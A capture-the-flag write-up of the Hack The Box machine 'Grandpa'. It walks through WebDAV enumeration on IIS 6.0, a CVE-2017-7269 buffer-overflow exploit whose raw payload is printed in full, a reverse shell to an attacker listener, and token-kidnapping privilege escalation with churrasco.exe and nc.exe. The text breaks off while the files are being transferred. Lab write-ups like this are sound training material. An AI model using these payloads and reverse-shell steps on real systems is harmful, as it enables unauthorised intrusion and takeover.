---
title: Write-up Grandpa on HTB
author: eMVee
date: 2023-04-20 19:00:00 +0800
categories: [CTF, HTB]
tags: [HTB, OSCP, PNPT, WebDav, davtest, ScStoragePathFromUrl, CVE-2017-7269, SeImpersonatePrivilege, Token-Kidnapping, EDB-ID-6705, CVE-2008-1436]
render_with_liquid: false
---

Grandpa is a machine that is also a bit older and I have hacked before in the past. The machine is also on the TJnull list in preparation for the OSCP exam. That's why I'm going to hack this machine again.

## Let's getting started
As usual we should create a project directory for our target, identify our own IP address and assign the IP address of our target to a variable.
```bash
┌──(emvee㉿kali)-[~]
└─$ cd Documents/HTB

┌──(emvee㉿kali)-[~/Documents/HTB]
└─$ mcd Grandpa 

┌──(emvee㉿kali)-[~/Documents/HTB/Grandpa]
└─$ myip       

    inet 127.0.0.1
    inet 10.0.2.15
    inet 10.10.14.18

┌──(emvee㉿kali)-[~/Documents/HTB/Grandpa]
└─$ ip=10.129.254.80 

```

## Enumeration
As soon as everything is set we can start enumerating.
First let's see if the target is responding to our ping request.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Grandpa]
└─$ ping $ip -c 3                                
PING 10.129.254.80 (10.129.254.80) 56(84) bytes of data.
64 bytes from 10.129.254.80: icmp_seq=1 ttl=127 time=28.3 ms
64 bytes from 10.129.254.80: icmp_seq=2 ttl=127 time=33.3 ms
64 bytes from 10.129.254.80: icmp_seq=3 ttl=127 time=22.0 ms

--- 10.129.254.80 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms
rtt min/avg/max/mdev = 22.032/27.876/33.345/4.626 ms
```
The target answers to our ping request and in the ttl field I notice the value 127. This is a indicator that this machine is running a Windows version.

Let's continue with enumerating the machine. Let's start with a simple port scan with nmap.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Grandpa]
└─$ nmap -sC -T4 $ip -p- -Pn
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-20 20:35 CEST
Nmap scan report for 10.129.254.80
Host is up (0.016s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE
80/tcp open  http
| http-webdav-scan: 
|   WebDAV type: Unknown
|   Server Type: Microsoft-IIS/6.0
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|   Server Date: Thu, 20 Apr 2023 18:37:11 GMT
|_  Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|_http-title: Under Construction
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH

Nmap done: 1 IP address (1 host up) scanned in 95.66 seconds

```

There is only 1 TCP port open. Let's add this to our notes.
* Port 80
	* HTTP
	* IIS 6.0
	* webdav
	* Title: Under construction

Based on [Wikipedia](https://en.wikipedia.org/wiki/Internet_Information_Services) this might be a machine running on:
* Windows Server 2003
* Windows XP Professional x64 edition

Since we know the website has webdav we have to keep this in mind for futher enumeration after we have checked some tools like whatweb and nikto. Let's first run whatweb.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Grandpa]
└─$ whatweb http://$ip
http://10.129.254.80 [200 OK] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/6.0], IP[10.129.254.80], Microsoft-IIS[6.0][Under Construction], MicrosoftOfficeWebServer[5.0_Pub], UncommonHeaders[microsoftofficewebserver], X-Powered-By[ASP.NET]
```
It is powered by ASP.NET, so let's addd this our notes. This could be useful if we want to craft a payload to start running command or a reverse shell.

Now let's use nikto to see what we can discover..
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Grandpa]
└─$ nikto -h http://$ip     
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.129.254.80
+ Target Hostname:    10.129.254.80
+ Target Port:        80
+ Start Time:         2023-04-20 20:51:58 (GMT2)
---------------------------------------------------------------------------
+ Server: Microsoft-IIS/6.0
+ Retrieved microsoftofficewebserver header: 5.0_Pub
+ Retrieved x-powered-by header: ASP.NET
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'microsoftofficewebserver' found, with contents: 5.0_Pub
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-aspnet-version header: 1.1.4322
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Retrieved dasl header: <DAV:sql>
+ Retrieved dav header: 1, 2
+ Retrieved ms-author-via header: MS-FP/4.0,DAV
+ Uncommon header 'ms-author-via' found, with contents: MS-FP/4.0,DAV
+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH 
+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5647: HTTP method ('Allow' Header): 'MOVE' may allow clients to change file locations on the web server.
+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH 
+ OSVDB-5646: HTTP method ('Public' Header): 'DELETE' may allow clients to remove files on the web server.
+ OSVDB-397: HTTP method ('Public' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5647: HTTP method ('Public' Header): 'MOVE' may allow clients to change file locations on the web server.
+ WebDAV enabled (PROPFIND UNLOCK MKCOL COPY LOCK SEARCH PROPPATCH listed as allowed)
+ OSVDB-13431: PROPFIND HTTP verb may show the server's internal IP address: http://10.129.254.80/
+ OSVDB-396: /_vti_bin/shtml.exe: Attackers may be able to crash FrontPage by requesting a DOS device, like shtml.exe/aux.htm -- a DoS was not attempted.
+ OSVDB-3233: /postinfo.html: Microsoft FrontPage default file found.
+ OSVDB-3233: /_vti_inf.html: FrontPage/SharePoint is installed and reveals its version number (check HTML source for more information).
+ OSVDB-3500: /_vti_bin/fpcount.exe: Frontpage counter CGI has been found. FP Server version 97 allows remote users to execute arbitrary system commands, though a vulnerability in this version could not be confirmed. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-1376. http://www.securityfocus.com/bid/2252.
+ OSVDB-67: /_vti_bin/shtml.dll/_vti_rpc: The anonymous FrontPage user is revealed through a crafted POST.
+ /_vti_bin/_vti_adm/admin.dll: FrontPage/SharePoint file found.
+ 8067 requests: 0 error(s) and 27 item(s) reported on remote host
+ End Time:           2023-04-20 20:54:12 (GMT2) (134 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```
A lof of information is shown by nikto, but for the moment I have no idea how to use these. A lot of HTTP methods are allowed. Probably because of the webdav service.

Let's enumerate some more information about our target and run a webdav vulnerability scan with nmap.

```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Grandpa]
└─$ nmap -p80 --script=http-iis-webdav-vuln $ip
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-20 20:42 CEST
Nmap scan report for 10.129.254.80
Host is up (0.014s latency).

PORT   STATE SERVICE
80/tcp open  http
|_http-iis-webdav-vuln: WebDAV is ENABLED. No protected folder found; check not run. If you know a protected folder, add --script-args=webdavfolder=<path>

Nmap done: 1 IP address (1 host up) scanned in 27.13 seconds

```
Nothing special is found yet. Let's check what we can find with davtest.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Grandpa]
└─$ davtest -url http://$ip
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://10.129.254.80
********************************************************
NOTE    Random string for this session: bi1MuK
********************************************************
 Creating directory
MKCOL           FAIL
********************************************************
 Sending test files
PUT     shtml   FAIL
PUT     php     FAIL
PUT     html    FAIL
PUT     jsp     FAIL
PUT     cfm     FAIL
PUT     aspx    FAIL
PUT     txt     FAIL
PUT     cgi     FAIL
PUT     pl      FAIL
PUT     asp     FAIL
PUT     jhtml   FAIL

********************************************************
/usr/bin/davtest Summary:
```

Well it looks like we cannot upload a file with davtest to the root of the target. Perhaps we could find some interesting directories or files. Let's check with dirsearch
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Grandpa]
└─$ dirsearch -u http://$ip -e asp,aspx -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

  _|. _ _  _  _  _ _|_    v0.4.2                                                                                   
 (_||| _) (/_(_|| (_| )
 
 Extensions: asp, aspx | HTTP method: GET | Threads: 30 | Wordlist size: 220545

Output File: /home/emvee/.dirsearch/reports/10.129.254.80/_23-04-20_20-48-16.txt

Error Log: /home/emvee/.dirsearch/logs/errors-23-04-20_20-48-16.log

Target: http://10.129.254.80/

[20:48:16] Starting: 
[20:48:18] 301 -  151B  - /images  ->  http://10.129.254.80/images/        
[20:48:19] 301 -  151B  - /Images  ->  http://10.129.254.80/Images/        
[20:48:26] 301 -  151B  - /IMAGES  ->  http://10.129.254.80/IMAGES/        
[20:51:48] 403 -    1KB - /_private 

Task Completed  
```

There are two directories found by dirsearch. The `/_private` is a directory which response with the status code `403`. This might be interesting.
Let's check if there are any known vulnerabilities for `IIS 6.0` with searchsploit first.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Grandpa]
└─$ searchsploit IIS 6.0 
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
Microsoft IIS 4.0/5.0/6.0 - Internal IP Address/Internal Network Name Disclosure  | windows/remote/21057.txt
Microsoft IIS 5.0/6.0 FTP Server (Windows 2000) - Remote Stack Overflow           | windows/remote/9541.pl
Microsoft IIS 5.0/6.0 FTP Server - Stack Exhaustion Denial of Service             | windows/dos/9587.txt
Microsoft IIS 6.0 - '/AUX / '.aspx' Remote Denial of Service                      | windows/dos/3965.pl
Microsoft IIS 6.0 - ASP Stack Overflow Stack Exhaustion (Denial of Service) (MS10 | windows/dos/15167.txt
Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow          | windows/remote/41738.py
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass                           | windows/remote/8765.php
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (1)                       | windows/remote/8704.txt
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (2)                       | windows/remote/8806.pl
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (Patch)                   | windows/remote/8754.patch
Microsoft IIS 6.0/7.5 (+ PHP) - Multiple Vulnerabilities                          | windows/remote/19033.txt
---------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

```
Based on these results, the vulnerability `ScStoragePathFromUrl` lookst interesting. Could this be something we can control to setup a reverse shell?
Let's first read the exploit (41738) on [exploit-db.org](https://www.exploit-db.com/exploits/41738).
It looks like we can make the target run other stuff. Let's use our [Google Fu ](https://www.google.com/search?q=scstoragepathfromurl+remote+buffer+overflow+reverse+shell+github)
In one of the results the following URL looks interesting:
```URL 
https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269
```
The description of the exploits looks promossing, since we can start a reverse shell. Let's copy the content of the exploit into a new python file.
 Before starting the exploit we have to start a listener.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Grandpa]
└─$ sudo rlwrap nc -lvp 443
[sudo] password for emvee: 
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443

```
Now let's start the exploit.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Grandpa]
└─$ python CVE-2017-7269-IIS6-Webdav.py $ip 80 10.10.14.18 443
PROPFIND / HTTP/1.1
Host: localhost
Content-Length: 1744
If: <http://localhost/aaaaaaa￦ﾽﾨ￧ﾡﾣ￧ﾝﾡ￧ﾄﾳ￦ﾤﾶ￤ﾝﾲ￧ﾨﾹ￤ﾭﾷ￤ﾽﾰ￧ﾕﾓ￧ﾩﾏ￤ﾡﾨ￥ﾙﾣ￦ﾵﾔ￦ﾡﾅ￣ﾥﾓ￥ﾁﾬ￥ﾕﾧ￦ﾝﾣ￣ﾍﾤ￤ﾘﾰ￧ﾡﾅ￦ﾥﾒ￥ﾐﾱ￤ﾱﾘ￦ﾩﾑ￧ﾉﾁ￤ﾈﾱ￧ﾀﾵ￥ﾡﾐ￣ﾙﾤ￦ﾱﾇ￣ﾔﾹ￥ﾑﾪ￥ﾀﾴ￥ﾑﾃ￧ﾝﾒ￥ﾁﾡ￣ﾈﾲ￦ﾵﾋ￦ﾰﾴ￣ﾉﾇ￦ﾉﾁ￣ﾝﾍ￥ﾅﾡ￥ﾡﾢ￤ﾝﾳ￥ﾉﾐ￣ﾙﾰ￧ﾕﾄ￦ﾡﾪ￣ﾍﾴ￤ﾹﾊ￧ﾡﾫ￤ﾥﾶ￤ﾹﾳ￤ﾱﾪ￥ﾝﾺ￦ﾽﾱ￥ﾡﾊ￣ﾈﾰ￣ﾝﾮ￤ﾭﾉ￥ﾉﾍ￤ﾡﾣ￦ﾽﾌ￧ﾕﾖ￧ﾕﾵ￦ﾙﾯ￧ﾙﾨ￤ﾑﾍ￥ﾁﾰ￧ﾨﾶ￦ﾉﾋ￦ﾕﾗ￧ﾕﾐ￦ﾩﾲ￧ﾩﾫ￧ﾝﾢ￧ﾙﾘ￦ﾉﾈ￦ﾔﾱ￣ﾁﾔ￦ﾱﾹ￥ﾁﾊ￥ﾑﾢ￥ﾀﾳ￣ﾕﾷ￦ﾩﾷ￤ﾅﾄ￣ﾌﾴ￦ﾑﾶ￤ﾵﾆ￥ﾙﾔ￤ﾝﾬ￦ﾕﾃ￧ﾘﾲ￧ﾉﾸ￥ﾝﾩ￤ﾌﾸ￦ﾉﾲ￥ﾨﾰ￥ﾤﾸ￥ﾑﾈ￈ﾂ￈ﾂ￡ﾋﾀ￦ﾠﾃ￦ﾱﾄ￥ﾉﾖ￤ﾬﾷ￦ﾱﾭ￤ﾽﾘ￥ﾡﾚ￧ﾥﾐ￤ﾥﾪ￥ﾡﾏ￤ﾩﾒ￤ﾅﾐ￦ﾙﾍ￡ﾏﾀ￦ﾠﾃ￤ﾠﾴ￦ﾔﾱ￦ﾽﾃ￦ﾹﾦ￧ﾑﾁ￤ﾍﾬ￡ﾏﾀ￦ﾠﾃ￥ﾍﾃ￦ﾩﾁ￧ﾁﾒ￣ﾌﾰ￥ﾡﾦ￤ﾉﾌ￧ﾁﾋ￦ﾍﾆ￥ﾅﾳ￧ﾥﾁ￧ﾩﾐ￤ﾩﾬ> (Not <locktoken:write1>) <http://localhost/bbbbbbb￧ﾥﾈ￦ﾅﾵ￤ﾽﾃ￦ﾽﾧ￦ﾭﾯ￤ﾡﾅ￣ﾙﾆ￦ﾝﾵ￤ﾐﾳ￣ﾡﾱ￥ﾝﾥ￥ﾩﾢ￥ﾐﾵ￥ﾙﾡ￦ﾥﾒ￦ﾩﾓ￥ﾅﾗ￣ﾡﾎ￥ﾥﾈ￦ﾍﾕ￤ﾥﾱ￤ﾍﾤ￦ﾑﾲ￣ﾑﾨ￤ﾝﾘ￧ﾅﾹ￣ﾍﾫ￦ﾭﾕ￦ﾵﾈ￥ﾁﾏ￧ﾩﾆ￣ﾑﾱ￦ﾽﾔ￧ﾑﾃ￥ﾥﾖ￦ﾽﾯ￧ﾍﾁ￣ﾑﾗ￦ﾅﾨ￧ﾩﾲ￣ﾝﾅ￤ﾵﾉ￥ﾝﾎ￥ﾑﾈ￤ﾰﾸ￣ﾙﾺ￣ﾕﾲ￦ﾉﾦ￦ﾹﾃ￤ﾡﾭ￣ﾕﾈ￦ﾅﾷ￤ﾵﾚ￦ﾅﾴ￤ﾄﾳ￤ﾍﾥ￥ﾉﾲ￦ﾵﾩ￣ﾙﾱ￤ﾹﾤ￦ﾸﾹ￦ﾍﾓ￦ﾭﾤ￥ﾅﾆ￤ﾼﾰ￧ﾡﾯ￧ﾉﾓ￦ﾝﾐ￤ﾕﾓ￧ﾩﾣ￧ﾄﾹ￤ﾽﾓ￤ﾑﾖ￦ﾼﾶ￧ﾍﾹ￦ﾡﾷ￧ﾩﾖ￦ﾅﾊ￣ﾥﾅ￣ﾘﾹ￦ﾰﾹ￤ﾔﾱ￣ﾑﾲ￥ﾍﾥ￥ﾡﾊ￤ﾑﾎ￧ﾩﾄ￦ﾰﾵ￥ﾩﾖ￦ﾉﾁ￦ﾹﾲ￦ﾘﾱ￥ﾥﾙ￥ﾐﾳ￣ﾅﾂ￥ﾡﾥ￥ﾥﾁ￧ﾅﾐ￣ﾀﾶ￥ﾝﾷ￤ﾑﾗ￥ﾍﾡ￡ﾏﾀ￦ﾠﾃ￦ﾹﾏ￦ﾠﾀ￦ﾹﾏ￦ﾠﾀ￤ﾉﾇ￧ﾙﾪ￡ﾏﾀ￦ﾠﾃ￤ﾉﾗ￤ﾽﾴ￥ﾥﾇ￥ﾈﾴ￤ﾭﾦ￤ﾭﾂ￧ﾑﾤ￧ﾡﾯ￦ﾂﾂ￦ﾠﾁ￥ﾄﾵ￧ﾉﾺ￧ﾑﾺ￤ﾵﾇ￤ﾑﾙ￥ﾝﾗ￫ﾄﾓ￦ﾠﾀ￣ﾅﾶ￦ﾹﾯ￢ﾓﾣ￦ﾠﾁ￡ﾑﾠ￦ﾠﾃ￧﾿ﾾ￯﾿﾿￯﾿﾿￡ﾏﾀ￦ﾠﾃ￑ﾮ￦ﾠﾃ￧ﾅﾮ￧ﾑﾰ￡ﾐﾴ￦ﾠﾃ￢ﾧﾧ￦ﾠﾁ￩ﾎﾑ￦ﾠﾀ￣ﾤﾱ￦ﾙﾮ￤ﾥﾕ￣ﾁﾒ￥ﾑﾫ￧ﾙﾫ￧ﾉﾊ￧ﾥﾡ￡ﾐﾜ￦ﾠﾃ￦ﾸﾅ￦ﾠﾀ￧ﾜﾲ￧ﾥﾨ￤ﾵﾩ￣ﾙﾬ￤ﾑﾨ￤ﾵﾰ￨ﾉﾆ￦ﾠﾀ￤ﾡﾷ￣ﾉﾓ￡ﾶﾪ￦ﾠﾂ￦ﾽﾪ￤ﾌﾵ￡ﾏﾸ￦ﾠﾃ￢ﾧﾧ￦ﾠﾁVVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBRDDKLMN8KPM0KP4KOYM4CQJINDKSKPKPTKKQTKT0D8TKQ8RTJKKX1OTKIGJSW4R0KOIBJHKCKOKOKOF0V04PF0M0A>

```
The exploit has run, now let's check the listener to see if the connection has been established.


## Initial access
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Grandpa]
└─$ sudo rlwrap nc -lvp 443
[sudo] password for emvee: 
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.129.254.80.
Ncat: Connection from 10.129.254.80:1032.
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>


```
It looks like the connection has been established from the target. 
Now it is time to do some local enumeration on the target.

```bash
c:\windows\system32\inetsrv>whoami
whoami
nt authority\network service
```
`nt authority\network service`
```bash
c:\windows\system32\inetsrv>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Local Area Connection:

   Connection-specific DNS Suffix  . : .htb
   IP Address. . . . . . . . . . . . : 10.129.254.80
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.129.0.1

c:\windows\system32\inetsrv>hostname
hostname
granpa

```
Let's find out if we have access to the shares of the users.

```bash
C:\>cd "Documents and Settings"
cd "Documents and Settings"

C:\Documents and Settings>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is FDCB-B9EF

 Directory of C:\Documents and Settings

04/12/2017  05:32 PM    <DIR>          .
04/12/2017  05:32 PM    <DIR>          ..
04/12/2017  05:12 PM    <DIR>          Administrator
04/12/2017  05:03 PM    <DIR>          All Users
04/12/2017  05:32 PM    <DIR>          Harry
               0 File(s)              0 bytes
               5 Dir(s)   1,264,181,248 bytes free

C:\Documents and Settings>cd Administrator
cd Administrator
Access is denied.

C:\Documents and Settings>cd Harry
cd Harry
Access is denied.
```
We don't have access to the users. Now let's enumerate that system. We have to know what platform is used before running any exploit.
```bash
C:\Documents and Settings>systeminfo
systeminfo

Host Name:                 GRANPA
OS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition
OS Version:                5.2.3790 Service Pack 2 Build 3790
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Uniprocessor Free
Registered Owner:          HTB
Registered Organization:   HTB
Product ID:                69712-296-0024942-44782
Original Install Date:     4/12/2017, 5:07:40 PM
System Up Time:            0 Days, 0 Hours, 56 Minutes, 27 Seconds
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x86 Family 6 Model 85 Stepping 7 GenuineIntel ~2293 Mhz
BIOS Version:              INTEL  - 6040000
Windows Directory:         C:\WINDOWS
System Directory:          C:\WINDOWS\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (GMT+02:00) Athens, Beirut, Istanbul, Minsk
Total Physical Memory:     1,023 MB
Available Physical Memory: 746 MB
Page File: Max Size:       2,470 MB
Page File: Available:      2,289 MB
Page File: In Use:         181 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 1 Hotfix(s) Installed.
                           [01]: Q147222
Network Card(s):           N/A

```
There is only one hotfix installed. So probably we can use and old exploit to escape our privileges. Let's check what privileges we have as `network service`.
```bash
C:\Documents and Settings>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAuditPrivilege              Generate security audits                  Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
```
Well, there is a interesting permission `SEImpersonalPrivilege` shown in the results. This does remind me to exploit it with one of the potatos probably. But before looking one of them we have to be sure. Let's do som research first and check searchsploit for known exploit for Windows (server) 2003 in combination with Privilege Escalation.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Grandpa]
└─$ searchsploit windows 2003 privilege escalation
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
Microsoft Windows NT 4.0/2000 - Local Descriptor Table Privilege Escalation (MS04 | windows/local/23989.c
Microsoft Windows Server 2000 - CreateFile API Named Pipe Privilege Escalation (1 | windows/local/22882.c
Microsoft Windows Server 2000 - CreateFile API Named Pipe Privilege Escalation (2 | windows/local/22883.c
Microsoft Windows Server 2003 - Token Kidnapping Local Privilege Escalation       | windows/local/6705.txt
Microsoft Windows Server 2003 SP2 - Local Privilege Escalation (MS14-070)         | windows/local/35936.py
Microsoft Windows Server 2003 SP2 - TCP/IP IOCTL Privilege Escalation (MS14-070)  | windows/local/37755.c
Microsoft Windows Utility Manager - Local Privilege Escalation (MS04-011)         | windows/local/271.c
Microsoft Windows XP - Redirector Privilege Escalation                            | windows/local/22225.txt
Microsoft Windows XP SP3 (x86) / 2003 SP2 (x86) - 'NDProxy' Local Privilege Escal | windows_x86/local/37732.c
Microsoft Windows XP/2000/2003 - Desktop Wall Paper System Parameter Privilege Es | windows/local/33012.c
Microsoft Windows XP/2000/2003 - Keyboard Event Privilege Escalation              | windows/local/26222.c
Microsoft Windows XP/2003 - 'afd.sys' Local Privilege Escalation (K-plugin) (MS08 | windows/local/6757.txt
Microsoft Windows XP/2003 - 'afd.sys' Local Privilege Escalation (MS11-080)       | windows/local/18176.py
Microsoft Windows XP/2003 - RPCSS Service Isolation Privilege Escalation          | windows/local/32892.txt
Microsoft Windows XP/Vista/2000/2003 - Double-Free Memory Corruption Privilege Es | windows/local/33593.c
Microsoft Windows XP/Vista/2000/2003/2008 Kernel - Usermode Callback Privilege Es | windows/dos/31585.c
Microsoft Windows XP/Vista/2003/2008 - WMI Service Isolation Privilege Escalation | windows/local/32891.txt
ViRobot Desktop 5.5 and Server 3.5 < 2008.8.1.1 - Local Privilege Escalation      | windows/local/15764.txt
Zoho ManageEngine ADManager Plus 6.6 (Build < 6659) - Privilege Escalation        | windows/local/46707.txt
---------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

```

Using some [Google Fu](https://www.google.com/search?q=seimpersonate+windows+2003+server+exploit) again to look for interesting privilege escaltion. The following title `Microsoft Windows Server 2003 - Token Kidnapping Local Privilege Escalation` is one of the things looking interesting. Let's open the exploit, this was identified with searchsploit as well.
```
https://www.exploit-db.com/exploits/6705
```
The exploit description is very interesting.
```
Basically if you can run code under any service in Win2k3 then you can own Windows, this is because Windows 
services accounts can impersonate.  Other process (not services) that can impersonate are IIS 6 worker processes 
so if you can run code from an ASP .NET or classic ASP web application then you can own Windows too. If you provide 
shared hosting services then I would recomend to not allow users to run this kind of code from ASP.

```
If this is true, we can escalate our privileges.
Reading further, the example is explained:
```

-Exploiting IIS 6 with ASP .NET :
...
System.Diagnostics.Process myP = new System.Diagnostics.Process();
myP.StartInfo.RedirectStandardOutput = true;
myP.StartInfo.FileName=Server.MapPath("churrasco.exe");
myP.StartInfo.UseShellExecute = false;
myP.StartInfo.Arguments= " \"net user /add hacker\" ";
myP.Start();
string output = myP.StandardOutput.ReadToEnd();
Response.Write(output);
...
```

A backup link is here: [https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/6705.zip](https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/6705.zip)

Let's download this file to our attacker machine.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Grandpa]
└─$ wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/6705.zip
--2023-04-20 21:42:21--  https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/6705.zip
Resolving gitlab.com (gitlab.com)... 172.65.251.78, 2606:4700:90:0:f22e:fbec:5bed:a9b9
Connecting to gitlab.com (gitlab.com)|172.65.251.78|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16744 (16K) [application/octet-stream]
Saving to: ‘6705.zip’

6705.zip                     100%[==============================================>]  16.35K  --.-KB/s    in 0.001s  

2023-04-20 21:42:22 (14.1 MB/s) - ‘6705.zip’ saved [16744/16744]

```
Now let's extract the archive.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Grandpa]
└─$ unzip 6705.zip 
Archive:  6705.zip
  inflating: Churrasco/Churrasco.cpp  
  inflating: Churrasco/Churrasco.ncb  
  inflating: Churrasco/Churrasco.sln  
  inflating: Churrasco/Churrasco.suo  
  inflating: Churrasco/Churrasco.vcproj  
  inflating: Churrasco/ReadMe.txt    
  inflating: Churrasco/stdafx.cpp    
  inflating: Churrasco/stdafx.h 
```
Okay, to get a executable, we have to compile the source or we can search on Google for Churrasco.exe on Github. Since I don't have a Windows machine available to compile source I choos eto search for a [executable on Github](https://www.google.com/search?q=churrasco.exe+).

The first results looks promissing, let's see if we can download the executable.
```
https://github.com/Re4son/Churrasco
```

Now let's copy the link to the executable and download it to our Kali machine.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Grandpa/Churrasco]
└─$ wget https://github.com/Re4son/Churrasco/raw/master/churrasco.exe 
--2023-04-20 22:05:54--  https://github.com/Re4son/Churrasco/raw/master/churrasco.exe
Resolving github.com (github.com)... 140.82.121.3
Connecting to github.com (github.com)|140.82.121.3|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://raw.githubusercontent.com/Re4son/Churrasco/master/churrasco.exe [following]
--2023-04-20 22:05:54--  https://raw.githubusercontent.com/Re4son/Churrasco/master/churrasco.exe
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.111.133, 185.199.110.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 31232 (30K) [application/octet-stream]
Saving to: ‘churrasco.exe’

churrasco.exe                100%[==============================================>]  30.50K  --.-KB/s    in 0.001s  

2023-04-20 22:05:55 (20.1 MB/s) - ‘churrasco.exe’ saved [31232/31232]

```

we have to copy the exploit and  `nc.exe` to our target, to setup a reverse shell to our system. Let's copy the binary to our working directory.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Grandpa/Churrasco]
└─$ locate nc.exe    
/usr/lib/mono/4.5/cert-sync.exe
/usr/share/seclists/Web-Shells/FuzzDB/nc.exe
/usr/share/sqlninja/apps/nc.exe
/usr/share/windows-resources/binaries/nc.exe

┌──(emvee㉿kali)-[~/Documents/HTB/Grandpa/Churrasco]
└─$ cp /usr/share/windows-resources/binaries/nc.exe .    
```

Now we have to transfer it to the target. We can start a Python webserver on our machine and download the file on the target.
```bash 
┌──(emvee㉿kali)-[~/Documents/HTB/Grandpa/Churrasco]
└─$ sudo python3 -m http.server 80                
[sudo] password for emvee: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```
Since the Python webserver is up and running we can download the executable on the target.
```bash
